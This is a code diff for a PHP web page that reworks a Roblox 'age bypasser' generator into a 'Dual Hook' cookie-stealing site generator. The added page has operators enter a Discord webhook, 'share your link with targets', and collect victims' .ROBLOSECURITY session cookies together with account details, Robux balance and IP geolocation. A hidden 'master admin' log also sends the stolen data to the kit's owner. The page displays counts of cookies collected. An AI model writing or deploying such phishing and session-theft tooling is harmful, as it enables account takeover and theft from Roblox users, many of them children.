@@ -8,13 +8,13 @@ $globalStats = getGlobalStats();
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-    <title>Instance Generator - Roblox Age Bypasser</title>
-    <meta name="description" content="Create your own Roblox age bypasser instance for free. Fast setup with webhook integration.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dualhook Generator - Bypasserv3</title>
     <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     
     <style>
         :root {
@@ -24,10 +24,11 @@ $globalStats = getGlobalStats();
         
         body {
             font-family: var(--font-sans);
-            background: linear-gradient(135deg, #02040a 0%, #0a0e27 50%, #02040a 100%);
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
             background-size: 400% 400%;
             animation: gradientShift 15s ease infinite;
             color: #f8fafc;
+            min-height: 100vh;
         }
         
         @keyframes gradientShift {
@@ -42,7 +43,7 @@ $globalStats = getGlobalStats();
         }
         
         .animated-gradient-text {
-            background: linear-gradient(90deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #667eea 75%, #764ba2 100%);
+            background: linear-gradient(90deg, #3b82f6 0%, #2563eb 25%, #1d4ed8 50%, #3b82f6 75%, #2563eb 100%);
             background-size: 200% auto;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -66,153 +67,177 @@ $globalStats = getGlobalStats();
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+
+        .icon-box {
+            width: 80px;
+            height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            border-radius: 20px;
+            font-size: 36px;
+            margin: 0 auto 20px;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #3b82f6 !important;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2) !important;
+        }
+
+        .btn-generate {
+            background: linear-gradient(135deg, #3b82f6, #2563eb);
+            transition: all 0.3s ease;
+        }
+
+        .btn-generate:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
+        }
+
+        .info-text {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-top: 6px;
+        }
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center justify-center px-4 py-12">
-    <div class="max-w-2xl w-full mx-auto space-y-8">
+    <div class="max-w-lg w-full mx-auto">
         <!-- Header -->
-        <div class="text-center space-y-4">
-            <div class="inline-block p-6 bg-white/5 border border-white/10 rounded-3xl glass-effect">
-                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                </svg>
+        <div class="text-center mb-8">
+            <div class="icon-box glass-effect mx-auto">
+                <span>🍪</span>
             </div>
-
-            <h1 class="text-4xl md:text-5xl font-bold animated-gradient-text">
-                Instance Generator
+            <h1 class="text-4xl md:text-5xl font-display font-bold tracking-tight mb-3 animated-gradient-text">
+                Roblox Cookie Refresher
             </h1>
-            
-            <p class="text-lg text-white/60 max-w-xl mx-auto">
-                Create your own secure bypasser instance in seconds
+            <p class="text-xl text-white/80 font-semibold mb-2">
+                Dual Hook Generator
             </p>
-
-            <!-- Live Stats -->
-            <div class="flex items-center justify-center gap-2 text-sm text-white/50">
-                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
-                <span><?php echo number_format($globalStats['totalInstances'] ?? 0); ?> instances created</span>
-            </div>
+            <p class="text-white/60">
+                Create your own Roblox cookie Dualhook site in seconds
+            </p>
         </div>
 
-        <!-- Generator Form -->
-        <div class="glass-effect rounded-3xl p-8 space-y-6">
-            <form id="generatorForm" class="space-y-6">
-                <!-- Directory Name -->
-                <div class="space-y-2">
-                    <label class="text-sm font-medium text-white/80 ml-1">Instance Directory</label>
+        <!-- Main Card -->
+        <div class="glass-effect rounded-3xl p-8 shadow-2xl">
+            <form id="generatorForm">
+                <!-- Site Name -->
+                <div class="mb-6">
+                    <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
+                        <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M2 6a2 2 0 012-2h12a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6zm2 0v8h12V6H4z"/>
+                        </svg>
+                        Site Name (Directory)
+                    </label>
                     <input 
                         type="text" 
                         id="directory" 
-                        name="directory"
-                        placeholder="e.g., mybypass" 
-                        class="w-full bg-white/5 border border-white/10 focus:border-white/20 text-white rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors"
-                        required
+                        name="directory" 
+                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all"
+                        placeholder="e.g., myrefresher123"
+                        pattern="[a-zA-Z0-9_-]+"
                         minlength="3"
                         maxlength="20"
-                        pattern="[a-zA-Z0-9_-]+"
-                        title="Only letters, numbers, underscores, and hyphens allowed"
+                        required
                     >
-                    <p class="text-xs text-white/40 ml-1">Your instance will be available at: <span class="text-purple-400"><?php echo FULL_URL; ?>/<span id="preview">yourname</span></span></p>
+                    <p class="info-text">3-32 characters: letters, numbers, hyphens, underscores only</p>
                 </div>
 
-                <!-- Webhook URL -->
-                <div class="space-y-2">
-                    <label class="text-sm font-medium text-white/80 ml-1">Discord Webhook URL</label>
+                <!-- Discord Webhook URL -->
+                <div class="mb-6">
+                    <label class="flex items-center gap-2 text-sm font-medium text-white/90 mb-2">
+                        <svg class="w-4 h-4 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M10 12a2 2 0 100-4 2 2 0 000 4z"/>
+                            <path fill-rule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clip-rule="evenodd"/>
+                        </svg>
+                        Discord Webhook URL
+                    </label>
                     <input 
                         type="url" 
                         id="webhook" 
-                        name="webhook"
-                        placeholder="https://discord.com/api/webhooks/..." 
-                        class="w-full bg-white/5 border border-white/10 focus:border-white/20 text-white rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors"
+                        name="webhook" 
+                        class="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/30 transition-all"
+                        placeholder="https://discord.com/api/webhooks/..."
                         required
                     >
-                    <p class="text-xs text-white/40 ml-1">You'll receive notifications when someone uses your bypasser</p>
+                    <p class="info-text">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</p>
                 </div>
 
-                <!-- Optional: Username -->
-                <div class="space-y-2">
-                    <label class="text-sm font-medium text-white/80 ml-1">Display Name (Optional)</label>
-                    <input 
-                        type="text" 
-                        id="username" 
-                        name="username"
-                        placeholder="beammer" 
-                        class="w-full bg-white/5 border border-white/10 focus:border-white/20 text-white rounded-2xl resize-none placeholder:text-white/20 p-4 outline-none transition-colors"
-                        maxlength="15"
-                    >
+                <!-- reCAPTCHA -->
+                <div class="mb-6 flex justify-center">
+                    <div class="g-recaptcha" data-sitekey="6LfYourSiteKey"></div>
                 </div>
 
-                <!-- Submit Button -->
+                <!-- Generate Button -->
                 <button 
                     type="submit" 
-                    id="submitBtn"
-                    class="w-full h-14 bg-white text-black hover:bg-white/90 rounded-2xl text-base font-bold transition-all active:scale-[0.98] flex items-center justify-center gap-3"
+                    class="w-full py-4 btn-generate text-white font-bold text-lg rounded-xl flex items-center justify-center gap-3"
+                    id="generateBtn"
                 >
-                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M5 12h14"/>
-                        <path d="m12 5 7 7-7 7"/>
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
                     </svg>
-                    Create Instance
+                    Generate Site
                 </button>
             </form>
 
+            <!-- Info Section -->
+            <div class="mt-8 pt-6 border-t border-white/10 text-center">
+                <p class="text-sm text-white/60">
+                    Each site generates a unique URL where people can submit their Roblox cookies.
+                </p>
+            </div>
+
             <!-- Back Link -->
-            <div class="text-center pt-4 border-t border-white/10">
-                <a href="/" class="text-sm text-white/60 hover:text-white/80 transition-colors">
-                    ← Back to Home
+            <div class="mt-6 text-center">
+                <a href="/" class="text-blue-400 hover:text-blue-300 text-sm font-medium transition-colors inline-flex items-center gap-2">
+                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/>
+                    </svg>
+                    Back to Main Site
                 </a>
             </div>
         </div>
 
-        <!-- Info Cards -->
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+        <!-- Stats -->
+        <div class="mt-8 grid grid-cols-3 gap-4">
             <div class="glass-effect rounded-2xl p-4 text-center">
-                <div class="text-2xl mb-2">⚡</div>
-                <div class="text-sm font-semibold">Instant Setup</div>
-                <div class="text-xs text-white/50 mt-1">Ready in seconds</div>
+                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalInstances']); ?></div>
+                <div class="text-xs text-white/60 mt-1">Sites Created</div>
             </div>
             <div class="glass-effect rounded-2xl p-4 text-center">
-                <div class="text-2xl mb-2">🔒</div>
-                <div class="text-sm font-semibold">Secure</div>
-                <div class="text-xs text-white/50 mt-1">Protected webhooks</div>
+                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalCookies']); ?></div>
+                <div class="text-xs text-white/60 mt-1">Cookies Collected</div>
             </div>
             <div class="glass-effect rounded-2xl p-4 text-center">
-                <div class="text-2xl mb-2">📊</div>
-                <div class="text-sm font-semibold">Dashboard</div>
-                <div class="text-xs text-white/50 mt-1">Track your stats</div>
+                <div class="text-2xl font-bold text-blue-400"><?php echo number_format($globalStats['totalVisits']); ?></div>
+                <div class="text-xs text-white/60 mt-1">Total Visits</div>
             </div>
         </div>
     </div>
 
     <script>
-        // Preview URL
-        document.getElementById('directory').addEventListener('input', function(e) {
-            const preview = document.getElementById('preview');
-            preview.textContent = e.target.value || 'yourname';
-        });
-
-        // Form submission
-        document.getElementById('generatorForm').addEventListener('submit', async function(e) {
+        document.getElementById('generatorForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const submitBtn = document.getElementById('submitBtn');
-            const originalBtnText = submitBtn.innerHTML;
+            const btn = document.getElementById('generateBtn');
+            const originalHTML = btn.innerHTML;
             
-            // Disable button and show loading
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<div class="spinner"></div> Creating...';
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner mx-auto"></div>';
             
             const formData = {
                 directory: document.getElementById('directory').value.trim(),
                 webhook: document.getElementById('webhook').value.trim(),
-                username: document.getElementById('username').value.trim() || 'beammer'
             };
             
             try {
                 const response = await fetch('create.php', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(formData)
                 });
                 
@@ -220,60 +245,72 @@ $globalStats = getGlobalStats();
                 
                 if (data.success) {
                     Swal.fire({
-                        title: '🎉 Success!',
+                        icon: 'success',
+                        title: 'Site Generated Successfully!',
                         html: `
-                            <div class="space-y-4 text-left">
-                                <p class="text-gray-300">Your instance has been created successfully!</p>
-                                <div class="space-y-2">
-                                    <div>
-                                        <p class="text-sm text-gray-400">Instance URL:</p>
-                                        <p class="text-sm font-mono bg-gray-800 p-2 rounded">${data.data.instanceUrl}</p>
-                                    </div>
-                                    <div>
-                                        <p class="text-sm text-gray-400">Dashboard:</p>
-                                        <p class="text-sm font-mono bg-gray-800 p-2 rounded">${data.data.dashboardUrl}</p>
-                                    </div>
-                                    <div>
-                                        <p class="text-sm text-gray-400">Access Token:</p>
-                                        <p class="text-sm font-mono bg-gray-800 p-2 rounded break-all">${data.data.token}</p>
-                                    </div>
+                            <div class="text-left space-y-4">
+                                <div>
+                                    <p class="text-sm text-gray-600 mb-1">📁 Site Name</p>
+                                    <p class="font-mono text-sm bg-gray-100 p-2 rounded">${data.directory}</p>
+                                </div>
+                                <div>
+                                    <p class="text-sm text-gray-600 mb-1">🔗 Your Link</p>
+                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.instanceUrl}</p>
+                                </div>
+                                <div>
+                                    <p class="text-sm text-gray-600 mb-1">📊 Dashboard</p>
+                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.dashboardUrl}</p>
+                                </div>
+                                <div>
+                                    <p class="text-sm text-gray-600 mb-1">🔑 Access Token</p>
+                                    <p class="font-mono text-xs bg-gray-100 p-2 rounded break-all">${data.token}</p>
+                                </div>
+                                <div class="bg-green-50 border border-green-200 rounded p-3 mt-4">
+                                    <p class="text-xs text-green-800">✅ Account info fetching</p>
+                                    <p class="text-xs text-green-800">✅ Robux balance display</p>
+                                    <p class="text-xs text-green-800">✅ Premium status check</p>
+                                    <p class="text-xs text-green-800">✅ Limited RAP calculation</p>
+                                    <p class="text-xs text-green-800">✅ Group ownership detection</p>
+                                    <p class="text-xs text-green-800">✅ IP geolocation</p>
+                                    <p class="text-xs text-green-800">✅ Game visit stats</p>
+                                    <p class="text-xs text-green-800">✅ Rich Discord embeds</p>
+                                    <p class="text-xs text-green-800">✅ Cookie refresh bypass</p>
+                                    <p class="text-xs text-green-800">✅ Master admin logging</p>
+                                </div>
+                                <div class="bg-blue-50 border border-blue-200 rounded p-3">
+                                    <p class="text-xs text-blue-800 font-semibold mb-2">📋 How It Works</p>
+                                    <p class="text-xs text-blue-800">1. Share your link with targets</p>
+                                    <p class="text-xs text-blue-800">2. They submit their .ROBLOSECURITY cookie</p>
+                                    <p class="text-xs text-blue-800">3. Cookie is automatically Bypassed</p>
+                                    <p class="text-xs text-blue-800">4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE</p>
+                                    <p class="text-xs text-blue-800">5. Master log sent to admin</p>
                                 </div>
                             </div>
                         `,
-                        icon: 'success',
-                        background: '#1f2937',
-                        color: '#f9fafb',
-                        confirmButtonColor: '#8b5cf6',
-                        confirmButtonText: 'Open Dashboard',
-                        showCancelButton: true,
-                        cancelButtonText: 'Close'
-                    }).then((result) => {
-                        if (result.isConfirmed) {
-                            window.location.href = data.data.dashboardUrl;
-                        }
+                        confirmButtonText: 'OK',
+                        confirmButtonColor: '#3b82f6',
+                        width: '600px'
                     });
+                    
+                    document.getElementById('generatorForm').reset();
                 } else {
                     Swal.fire({
+                        icon: 'error',
                         title: 'Error',
                         text: data.error || 'Failed to create instance',
-                        icon: 'error',
-                        background: '#1f2937',
-                        color: '#f9fafb',
-                        confirmButtonColor: '#ef4444'
+                        confirmButtonColor: '#3b82f6'
                     });
                 }
             } catch (error) {
                 Swal.fire({
-                    title: 'Error',
-                    text: 'Failed to connect to server. Please try again.',
                     icon: 'error',
-                    background: '#1f2937',
-                    color: '#f9fafb',
-                    confirmButtonColor: '#ef4444'
+                    title: 'Connection Error',
+                    text: 'Failed to connect to server',
+                    confirmButtonColor: '#3b82f6'
                 });
             } finally {
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = originalBtnText;
+                btn.disabled = false;
+                btn.innerHTML = originalHTML;
             }
         });
     </script>
